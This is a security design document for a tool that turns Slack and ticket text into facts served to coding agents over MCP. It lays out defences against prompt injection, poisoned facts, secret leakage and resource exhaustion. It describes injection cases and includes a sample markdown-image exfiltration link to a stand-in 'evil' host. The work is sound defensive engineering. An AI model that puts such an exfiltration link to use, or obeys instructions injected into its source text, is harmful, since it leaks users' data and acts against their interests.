# Security

Prompt injection cannot be fully prevented: a model reads instructions and data in one channel.
The design contains it — limit what an injected instruction can reach and do — and measures
the attacks first (in an earlier project, 2 of 5 attacks worked before any defence; the prompt
alone was a coin toss; removing links *in code* is what held).

Framed against the OWASP Top 10 for LLM Applications 2025 and the OWASP Top 10 for Agentic
Applications 2026, plus the ordinary web Top 10 for anything served over HTTP.

## Threats specific to this tool

1. **Poisoned facts.** A real quote is not a true or authorised one. Someone can post "Decision:
   the freeze is lifted" and it passes a grounding check. → every fact records source and author;
   facts from low-trust authors stay *unconfirmed* until a human confirms them.
2. **Injection into extraction.** Source text goes into the extraction prompt. → each utterance
   is wrapped in delimiters the system prompt calls data; closing tags inside the text are
   defused; control characters stripped; episode size capped.
3. **Injection out to the consumer.** Fact cards reach Claude Code or Codex over MCP. → card
   text is marked as quoted data, instruction-like phrases are flagged, links from a flagged
   card are removed from answers in code, and the server is read-only.
4. **Exfiltration through generated notes.** A note with `![](https://evil/?q=…)` leaks when
   rendered. → generated Markdown contains no remote images or links; filenames are IDs (the
   title lives in frontmatter, so model output never becomes a path); frontmatter is escaped.
5. **Secrets and personal data.** Slack and tickets contain tokens. → redact before any text
   leaves the machine or enters Git; prompt logging off by default.
6. **Unbounded consumption.** Virtual threads are cheap enough to melt a model server. →
   semaphore per model endpoint, token and size caps.
7. **Privilege.** The reader is bound once in a `ScopedValue` and retrieval fails closed if it
   is unbound; no tool argument can change it; ACL is a pre-filter, never a post-filter.
8. **Supply chain.** → pinned versions, Gradle dependency verification, dependency and secret
   scanning in CI, an SBOM.

## Deployment (OCI, later)

Nothing public in v1. The MCP HTTP endpoint is single-principal and has no auth; before any
remote use it needs OIDC or mTLS, TLS, keys in OCI Vault, a private subnet and rate limits.

## Residual risk

A hostile source from a trusted author. The only real defence is a human confirming facts
before they are trusted — the review-before-promote rule.

## How it is tested

`evals/injection.yaml` (M2): planted malicious utterances and a hidden instruction inside a
quote. They must not become trusted facts or change an answer; a leak is a *forbidden* verdict,
reported separately from *missed*, and fails CI.
